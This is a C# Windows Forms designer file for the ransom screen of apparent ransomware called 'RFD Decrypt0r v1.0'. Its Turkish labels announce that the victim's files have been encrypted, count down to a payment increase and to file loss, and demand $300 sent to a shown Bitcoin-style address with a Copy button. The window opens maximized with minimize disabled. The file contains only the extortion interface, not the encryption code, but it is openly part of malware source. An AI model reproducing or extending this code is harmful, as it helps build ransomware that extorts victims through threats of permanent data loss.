
namespace RFDDesktop
{
    partial class RFDDesktop
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RFDDesktop));
            this.tbox_Desc = new System.Windows.Forms.RichTextBox();
            this.panel1 = new System.Windows.Forms.Panel();
            this.pictureBox2 = new System.Windows.Forms.PictureBox();
            this.panel5 = new System.Windows.Forms.Panel();
            this.lbl_Remaining2 = new System.Windows.Forms.Label();
            this.lbl_LostDate = new System.Windows.Forms.Label();
            this.lbl_Lost = new System.Windows.Forms.Label();
            this.lbl_LostTitle = new System.Windows.Forms.Label();
            this.panel4 = new System.Windows.Forms.Panel();
            this.lbl_Remaining1 = new System.Windows.Forms.Label();
            this.lbl_Raised = new System.Windows.Forms.Label();
            this.lbl_RaisedDate = new System.Windows.Forms.Label();
            this.lbl_RaisedTitle = new System.Windows.Forms.Label();
            this.panel2 = new System.Windows.Forms.Panel();
            this.combox_Lang = new System.Windows.Forms.ComboBox();
            this.lbl_Title = new System.Windows.Forms.Label();
            this.panel3 = new System.Windows.Forms.Panel();
            this.panel6 = new System.Windows.Forms.Panel();
            this.lbl_Payment = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.tbox_Address = new System.Windows.Forms.TextBox();
            this.button1 = new System.Windows.Forms.Button();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).BeginInit();
            this.panel5.SuspendLayout();
            this.panel4.SuspendLayout();
            this.panel2.SuspendLayout();
            this.panel3.SuspendLayout();
            this.panel6.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // tbox_Desc
            // 
            this.tbox_Desc.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.tbox_Desc.Font = new System.Drawing.Font("Times New Roman", 18F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.tbox_Desc.Location = new System.Drawing.Point(3, 54);
            this.tbox_Desc.Name = "tbox_Desc";
            this.tbox_Desc.ReadOnly = true;
            this.tbox_Desc.Size = new System.Drawing.Size(816, 527);
            this.tbox_Desc.TabIndex = 0;
            this.tbox_Desc.Text = "";
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.pictureBox2);
            this.panel1.Controls.Add(this.panel5);
            this.panel1.Controls.Add(this.panel4);
            this.panel1.Location = new System.Drawing.Point(12, 12);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(291, 655);
            this.panel1.TabIndex = 1;
            // 
            // pictureBox2
            // 
            this.pictureBox2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.pictureBox2.Image = global::RFDDesktop.Properties.Resources.security_icon;
            this.pictureBox2.Location = new System.Drawing.Point(9, 10);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(273, 171);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 4;
            this.pictureBox2.TabStop = false;
            this.pictureBox2.Click += new System.EventHandler(this.pictureBox2_Click);
            // 
            // panel5
            // 
            this.panel5.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel5.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel5.Controls.Add(this.lbl_Remaining2);
            this.panel5.Controls.Add(this.lbl_LostDate);
            this.panel5.Controls.Add(this.lbl_Lost);
            this.panel5.Controls.Add(this.lbl_LostTitle);
            this.panel5.Location = new System.Drawing.Point(9, 391);
            this.panel5.Name = "panel5";
            this.panel5.Size = new System.Drawing.Size(273, 161);
            this.panel5.TabIndex = 2;
            // 
            // lbl_Remaining2
            // 
            this.lbl_Remaining2.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_Remaining2.ForeColor = System.Drawing.Color.White;
            this.lbl_Remaining2.Location = new System.Drawing.Point(-1, 87);
            this.lbl_Remaining2.Name = "lbl_Remaining2";
            this.lbl_Remaining2.Size = new System.Drawing.Size(273, 20);
            this.lbl_Remaining2.TabIndex = 1;
            this.lbl_Remaining2.Text = "Kalan Süre";
            this.lbl_Remaining2.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // lbl_LostDate
            // 
            this.lbl_LostDate.AutoSize = true;
            this.lbl_LostDate.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_LostDate.ForeColor = System.Drawing.Color.White;
            this.lbl_LostDate.Location = new System.Drawing.Point(47, 46);
            this.lbl_LostDate.Name = "lbl_LostDate";
            this.lbl_LostDate.Size = new System.Drawing.Size(0, 20);
            this.lbl_LostDate.TabIndex = 1;
            this.lbl_LostDate.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // lbl_Lost
            // 
            this.lbl_Lost.AutoSize = true;
            this.lbl_Lost.Font = new System.Drawing.Font("Modern No. 20", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbl_Lost.ForeColor = System.Drawing.Color.White;
            this.lbl_Lost.Location = new System.Drawing.Point(7, 108);
            this.lbl_Lost.Name = "lbl_Lost";
            this.lbl_Lost.Size = new System.Drawing.Size(0, 50);
            this.lbl_Lost.TabIndex = 2;
            // 
            // lbl_LostTitle
            // 
            this.lbl_LostTitle.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_LostTitle.ForeColor = System.Drawing.Color.Yellow;
            this.lbl_LostTitle.Location = new System.Drawing.Point(6, 19);
            this.lbl_LostTitle.Name = "lbl_LostTitle";
            this.lbl_LostTitle.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.lbl_LostTitle.Size = new System.Drawing.Size(266, 18);
            this.lbl_LostTitle.TabIndex = 1;
            this.lbl_LostTitle.Text = "Dosyaların Kaybolacağı Zaman";
            this.lbl_LostTitle.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // panel4
            // 
            this.panel4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel4.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel4.Controls.Add(this.lbl_Remaining1);
            this.panel4.Controls.Add(this.lbl_Raised);
            this.panel4.Controls.Add(this.lbl_RaisedDate);
            this.panel4.Controls.Add(this.lbl_RaisedTitle);
            this.panel4.Location = new System.Drawing.Point(9, 199);
            this.panel4.Name = "panel4";
            this.panel4.Size = new System.Drawing.Size(273, 171);
            this.panel4.TabIndex = 2;
            // 
            // lbl_Remaining1
            // 
            this.lbl_Remaining1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lbl_Remaining1.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_Remaining1.ForeColor = System.Drawing.Color.White;
            this.lbl_Remaining1.Location = new System.Drawing.Point(-7, 91);
            this.lbl_Remaining1.Name = "lbl_Remaining1";
            this.lbl_Remaining1.Size = new System.Drawing.Size(275, 20);
            this.lbl_Remaining1.TabIndex = 0;
            this.lbl_Remaining1.Text = "Kalan Süre";
            this.lbl_Remaining1.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // lbl_Raised
            // 
            this.lbl_Raised.AutoSize = true;
            this.lbl_Raised.Font = new System.Drawing.Font("Modern No. 20", 36F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lbl_Raised.ForeColor = System.Drawing.Color.White;
            this.lbl_Raised.Location = new System.Drawing.Point(6, 115);
            this.lbl_Raised.Name = "lbl_Raised";
            this.lbl_Raised.Size = new System.Drawing.Size(0, 50);
            this.lbl_Raised.TabIndex = 0;
            // 
            // lbl_RaisedDate
            // 
            this.lbl_RaisedDate.AutoSize = true;
            this.lbl_RaisedDate.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_RaisedDate.ForeColor = System.Drawing.Color.White;
            this.lbl_RaisedDate.Location = new System.Drawing.Point(47, 48);
            this.lbl_RaisedDate.Name = "lbl_RaisedDate";
            this.lbl_RaisedDate.Size = new System.Drawing.Size(0, 20);
            this.lbl_RaisedDate.TabIndex = 0;
            // 
            // lbl_RaisedTitle
            // 
            this.lbl_RaisedTitle.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.lbl_RaisedTitle.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_RaisedTitle.ForeColor = System.Drawing.Color.Yellow;
            this.lbl_RaisedTitle.Location = new System.Drawing.Point(1, 19);
            this.lbl_RaisedTitle.Name = "lbl_RaisedTitle";
            this.lbl_RaisedTitle.Size = new System.Drawing.Size(271, 18);
            this.lbl_RaisedTitle.TabIndex = 0;
            this.lbl_RaisedTitle.Text = "Ödeme Miktarının Artacağı Tarih";
            this.lbl_RaisedTitle.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // panel2
            // 
            this.panel2.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel2.Controls.Add(this.combox_Lang);
            this.panel2.Controls.Add(this.lbl_Title);
            this.panel2.Controls.Add(this.tbox_Desc);
            this.panel2.Location = new System.Drawing.Point(309, 12);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(822, 586);
            this.panel2.TabIndex = 2;
            // 
            // combox_Lang
            // 
            this.combox_Lang.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.combox_Lang.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.combox_Lang.FormattingEnabled = true;
            this.combox_Lang.Items.AddRange(new object[] {
            "Turkish",
            "English"});
            this.combox_Lang.Location = new System.Drawing.Point(722, 27);
            this.combox_Lang.Name = "combox_Lang";
            this.combox_Lang.Size = new System.Drawing.Size(97, 21);
            this.combox_Lang.TabIndex = 2;
            this.combox_Lang.SelectedIndexChanged += new System.EventHandler(this.combox_Lang_SelectedIndexChanged);
            // 
            // lbl_Title
            // 
            this.lbl_Title.AutoSize = true;
            this.lbl_Title.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_Title.ForeColor = System.Drawing.Color.White;
            this.lbl_Title.Location = new System.Drawing.Point(14, 10);
            this.lbl_Title.Name = "lbl_Title";
            this.lbl_Title.Size = new System.Drawing.Size(417, 31);
            this.lbl_Title.TabIndex = 1;
            this.lbl_Title.Text = "Ooops, Dosyalarınız Şifrelendi!";
            // 
            // panel3
            // 
            this.panel3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel3.Controls.Add(this.panel6);
            this.panel3.Location = new System.Drawing.Point(309, 599);
            this.panel3.Name = "panel3";
            this.panel3.Size = new System.Drawing.Size(823, 68);
            this.panel3.TabIndex = 2;
            // 
            // panel6
            // 
            this.panel6.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel6.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel6.Controls.Add(this.lbl_Payment);
            this.panel6.Controls.Add(this.pictureBox1);
            this.panel6.Controls.Add(this.tbox_Address);
            this.panel6.Controls.Add(this.button1);
            this.panel6.Location = new System.Drawing.Point(8, 3);
            this.panel6.Name = "panel6";
            this.panel6.Size = new System.Drawing.Size(811, 62);
            this.panel6.TabIndex = 4;
            // 
            // lbl_Payment
            // 
            this.lbl_Payment.AutoSize = true;
            this.lbl_Payment.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.lbl_Payment.ForeColor = System.Drawing.Color.Yellow;
            this.lbl_Payment.Location = new System.Drawing.Point(212, 6);
            this.lbl_Payment.Name = "lbl_Payment";
            this.lbl_Payment.RightToLeft = System.Windows.Forms.RightToLeft.No;
            this.lbl_Payment.Size = new System.Drawing.Size(320, 18);
            this.lbl_Payment.TabIndex = 2;
            this.lbl_Payment.Text = "Aşağıda bulunan adrese 300$ gönderiniz. ";
            // 
            // pictureBox1
            // 
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.Location = new System.Drawing.Point(0, 3);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(204, 57);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 3;
            this.pictureBox1.TabStop = false;
            // 
            // tbox_Address
            // 
            this.tbox_Address.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.tbox_Address.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(162)));
            this.tbox_Address.Location = new System.Drawing.Point(209, 27);
            this.tbox_Address.Name = "tbox_Address";
            this.tbox_Address.ReadOnly = true;
            this.tbox_Address.Size = new System.Drawing.Size(548, 29);
            this.tbox_Address.TabIndex = 1;
            this.tbox_Address.Text = "1NT59L8wT9rdA7f8J2kMq6HRjHYXqVfymP";
            // 
            // button1
            // 
            this.button1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.button1.Location = new System.Drawing.Point(762, 23);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(44, 32);
            this.button1.TabIndex = 0;
            this.button1.Text = "Copy";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // RFDDesktop
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Brown;
            this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.ClientSize = new System.Drawing.Size(1132, 679);
            this.Controls.Add(this.panel3);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "RFDDesktop";
            this.ShowIcon = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "RFD Decrypt0r v1.0";
            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
            this.Load += new System.EventHandler(this.RFDDesktop_Load);
            this.LocationChanged += new System.EventHandler(this.RFDDesktop_LocationChanged);
            this.panel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            this.panel5.ResumeLayout(false);
            this.panel5.PerformLayout();
            this.panel4.ResumeLayout(false);
            this.panel4.PerformLayout();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.panel3.ResumeLayout(false);
            this.panel6.ResumeLayout(false);
            this.panel6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.RichTextBox tbox_Desc;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Label lbl_Title;
        private System.Windows.Forms.Panel panel3;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Panel panel5;
        private System.Windows.Forms.Label lbl_Remaining2;
        private System.Windows.Forms.Label lbl_LostDate;
        private System.Windows.Forms.Label lbl_Lost;
        private System.Windows.Forms.Label lbl_LostTitle;
        private System.Windows.Forms.Panel panel4;
        private System.Windows.Forms.Label lbl_Remaining1;
        private System.Windows.Forms.Label lbl_Raised;
        private System.Windows.Forms.Label lbl_RaisedDate;
        private System.Windows.Forms.Label lbl_RaisedTitle;
        private System.Windows.Forms.ComboBox combox_Lang;
        private System.Windows.Forms.Label lbl_Payment;
        private System.Windows.Forms.TextBox tbox_Address;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Panel panel6;
        private System.Windows.Forms.PictureBox pictureBox2;
    }
}

